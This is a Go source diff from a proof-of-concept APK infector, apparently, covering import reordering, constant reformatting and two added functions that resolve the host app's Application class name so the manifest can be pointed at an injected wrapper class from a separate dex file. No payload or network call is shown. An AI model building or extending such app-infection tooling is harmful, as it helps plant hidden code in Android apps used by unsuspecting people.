@@ -4,17 +4,17 @@ import (
 	"bytes"
 	"encoding/binary"
 	"encoding/xml"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
 	"golang.org/x/text/encoding/unicode"
 	"log"
-	"path/filepath"
 	"os"
-	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
+	"path/filepath"
 )
 
 const (
-	fileLenOffset        = 0x4
-	offsetTableOffset    = 0x24
-	offsetStringTableLen = 0xc
+	fileLenOffset             = 0x4
+	offsetTableOffset         = 0x24
+	offsetStringTableLen      = 0xc
 	stringTableInfoSizeOffset = 0x1c
 
 	// Name of application in our stub dex
@@ -27,6 +27,27 @@ var alignCount uint32
 var oldAppNameUTF16 string
 var newAppNameUTF16 string
 var OldAppNameUTF8 string
+
+// WrapperClassName returns the class name the patched manifest points
+// android:name at — the injected Application wrapper from InjectedApp.dex.
+func WrapperClassName() string { return newAppNameUTF8 }
+
+// HostAppClassName returns the fully-qualified name of the host's own
+// Application class. The wrapper extends it, so the dex patch has to rename the
+// stub's placeholder base class to exactly this name: an android:name written
+// relative (".MyApp") must be resolved against the manifest package, otherwise
+// the renamed base class does not exist and ART cannot load the wrapper.
+func HostAppClassName() string {
+	if OldAppNameUTF8 == "" {
+		return ""
+	}
+	pkg := getPackageName()
+	if pkg == "" {
+		return OldAppNameUTF8
+	}
+	return resolveClassName(pkg, OldAppNameUTF8)
+}
+
 var PlainPath, _ = filepath.Abs("AndroidManifest_plaintext.xml")
 
 func patchApplication() ([]byte, int) {
@@ -145,7 +166,7 @@ func patchOffsetTable(data []byte, appNameOff, lenDiff uint32) {
 	offsetTableReader := bytes.NewReader(data)
 
 	var j uint32 = 0
-	for i := uint32(1); i <= StringCnt - appNameOff; i++ {
+	for i := uint32(1); i <= StringCnt-appNameOff; i++ {
 
 		//read offset
 		err := binary.Read(offsetTableReader, binary.LittleEndian, &offset)
